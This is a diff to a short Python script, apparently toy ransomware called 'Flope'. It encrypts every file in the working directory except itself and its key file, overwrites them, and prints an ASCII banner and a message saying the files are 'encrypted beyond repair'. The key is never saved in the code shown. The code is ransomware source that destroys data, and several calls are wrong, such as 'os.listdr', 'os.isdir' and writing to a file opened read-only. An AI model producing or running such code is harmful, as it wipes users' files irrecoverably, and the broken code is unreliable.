@@ -4,7 +4,7 @@ from cryptography.Fernet import Fernet
 files = []
 key = Fernet.generate_key()
 
-class bcolors:
+class fcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
     OKCYAN = '\033[96m'
@@ -14,6 +14,16 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+
+def showName():
+ print(fcolors.WARNING + "___________.__                        ")
+ print(fcolors.WARNING + "\_   _____/|  |   ____ ______   ____  ")
+ print(fcolors.WARNING + " |    __)  |  |  /  _ \\____ \_/ __ \ ")
+ print(fcolors.WARNING + " |     \   |  |_(  <_> )  |_> >  ___/ ")
+ print(fcolors.WARNING + " \___  /   |____/\____/|   __/ \___  >")
+ print(fcolors.WARNING + "     \/                |__|        \/ ")
+ print(fcolors.OKCYAN + "The flop don't stop!")
+
 
 for file in os.listdr():
   if file == "main.py" or file == "flope.key" or os.isdir(file):
@@ -26,4 +36,6 @@ while True:
   flopeData = Fernet(key).encrypt(flopData)
   with open(file, "rb") as flile:
     flile.write(flopeData)
-  
+
+showName()
+print('Sorry, but your files have been encrypted beyond repair. Please get a good antivirus.')
